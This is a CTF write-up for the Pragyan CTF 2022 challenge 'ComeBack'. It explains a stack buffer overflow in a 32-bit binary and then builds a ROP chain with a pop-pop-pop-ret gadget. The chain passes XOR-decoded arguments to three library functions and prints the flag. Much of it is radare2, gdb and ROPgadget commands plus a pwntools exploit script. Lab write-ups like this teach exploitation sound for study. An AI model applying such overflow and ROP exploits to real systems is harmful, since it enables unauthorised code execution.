# Pragyan CTF 2022: ComeBack
## Write-Up

1) It is a ROP challenge. Inspect the binary using radare2.

``` r2 vuln ``` followed by ```aaaa``` and ```afl``` to analyze the functions.

2) In the new_main function, a buffer of 0x20 is created but the input reads in 0x200, for a possible buffer overflow.

3) Now to find the junk to break into stack, you can use gdb or an extension of gdb called gef to find it.

``` pattern create 60``` followed by ```r``` to run the program and input the buffer created.

In this way, pattern offset can be found.

4) You would notice three functions tryOne, tryTwo, tryThree. These functions are built in libvuln.so. So to find the arguments to be passed to these functions, inspect libvuln.so using radare2.

To find parameters to be passed to tryOne function, ``` pdf @ sym.tryOne``` and you will find the parameters being checked in a cmp.

5) To pass values to function, a gadget must be used. Since three arguments are passed, ```pop esi ; pop edi ; pop ebp ; ret``` should do.
The gadget address can be found using radare2 or using a tool called ROPgadget, ``` ROPgadget --binary vuln --ropchain | grep ": pop esi ; pop edi ; pop ebp ; ret" ```

6) The parameters of the function is checked with the XOR encrypted strings but the parameters are taken in int datatype which hints that the parameters might be hex. The __encrypt() function is called in strcmp() function. Now to get the decrypted function parameters, we can run

```
def encryptDecrypt(inpString):
    xorKey = "3T5*)Z'0B6";
    length = len(inpString);

    for i in range(length):
     
        inpString = (inpString[:i] +
             chr(ord(inpString[i]) ^ ord(xorKey[i])) +
                     inpString[i + 1:]);
        print(inpString[i], end = "");
     
    return inpString;
 

if __name__ == '__main__':
    encryptedArg = ""; # Input the encrypted argument
 
    # Encrypt the string
    print("Parameter: ", end = "");
    encryptedArg = encryptDecrypt(encryptedArg);
```

XORkey can be found in radare2 by disassembling the function __encrypt() using ```pdf @ sym.__encrypt``` and address where XOR key is stored can be found. Run the above script for 3 different variables to get the parameters. These are variables in the global scope of libvuln.so file. The parameters' offset can be found in disassembly of each tryOne, tryTwo and tryThree and their addresses. The varaiables' name can be determined in gdb using command ```info variables``` and its address. The variable names are check_p1, check_p2, check_p3.  

Run the command ```objdump -d -s -j .data ./libvuln.so```
output :-
```
./libvuln.so:     file format elf32-i386

Contents of section .data:
 403c 3c400000 032c514f 483e4555 27500000  <@...,QOH>EU'P..
 404c 032c531a 193e4451 24530000 032c511a  .,S..>DQ$S...,Q.
 405c 193e4151 215300                      .>AQ!S.         

Disassembly of section .data:

0000403c <__dso_handle>:
    403c:	3c 40 00 00                                         <@..

00004040 <check_p1>:
    4040:	03 2c 51 4f 48 3e 45 55 27 50 00 00                 .,QOH>EU'P..

0000404c <check_p2>:
    404c:	03 2c 53 1a 19 3e 44 51 24 53 00 00                 .,S..>DQ$S..

00004058 <check_p3>:
    4058:	03 2c 51 1a 19 3e 41 51 21 53 00                    .,Q..>AQ!S.
```

7) In order for eip to perform the instructions we want, fill up the buffer and the values in the register before saved eip in the stack with a payload buffer. Lets find out the buffer value required.  

![Start gdb](./images/i1.png?raw=true)

Hitting break point set at new_main function- 

![Break at new_main](./images/i2.png?raw=true)

Provide an input of ```python3 -c 'print("A"*100)'``` as buffer. Checking registers upto where our buffer input is stored completely in a register.

![Check esp](./images/i3.png?raw=true)

Look at the esp address(which is also the esp address at the start) after leave instruction and find the offset by ```0xffffd1ac-0xffffd178```.
It will be 0x34 whose decimal value is 52.

![Find offset](./images/i4.png?raw=true)

8) Now a chain can be build. Exploit :-

```
from pwn import *

import struct

binary = context.binary = ELF('./vuln')
gadget = struct.pack("I", 0x080493d1) # pop esi ; pop edi ; pop ebp ; ret
buf  = b"A" * 52
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryOne-4) # tryOne()
buf += gadget
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += p32(binary.sym.tryTwo-4) # tryTwo()
buf += gadget
buf += struct.pack("I", 0xf00dcafe)
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += p32(binary.sym.tryThree-4) # tryThree()
buf += gadget
buf += struct.pack("I", 0xd00dface)
buf += struct.pack("I", 0xdeadbeef)
buf += struct.pack("I", 0xf00dcafe)

with open('exp', 'wb') as exp:
    exp.write(buf)
```
8) Running ``` ./vuln < exp ```, will print out the flag.
